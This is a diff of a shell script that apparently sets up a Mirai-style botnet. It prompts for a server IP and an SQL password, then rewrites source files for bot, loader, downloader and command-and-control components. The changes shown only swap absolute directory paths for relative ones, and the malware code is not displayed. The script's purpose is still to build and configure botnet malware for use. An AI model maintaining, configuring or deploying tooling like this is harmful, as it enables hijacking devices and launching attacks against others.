@@ -279,7 +279,7 @@ echo -e "${WHITE} Enter The Fourth selection of Numbers of your server IP EX:185
 read fourth
 clear
 echo -e ""
-cd /bot/
+cd bot/
 rm -rf includes.h
 echo -e "#pragma once" > includes.h
 echo -e " " > includes.h
@@ -336,7 +336,7 @@ read BINDIP
 clear
 echo -e ""
 cd
-cd /loader/src/
+cd loader/src/
 rm -rf main.c
 echo -e "#include <stdio.h>" > main.c
 echo -e "#include <stdlib.h>" > main.c
@@ -470,7 +470,7 @@ clear
 echo -e ""
 
 cd
-cd /dlr/
+cd dlr/
 rm -rf main.c
 
 echo -e "#include <sys/types.h>" > main.c
@@ -762,7 +762,7 @@ echo -e "${WHITE} Enter Your SQL Password:${LIGHTRED} \c"
 read pass
 clear
 echo -e ""
-cd /cnc/
+cd cnc/
 rm -rf main.go
 
 echo -e "package main " > main.go
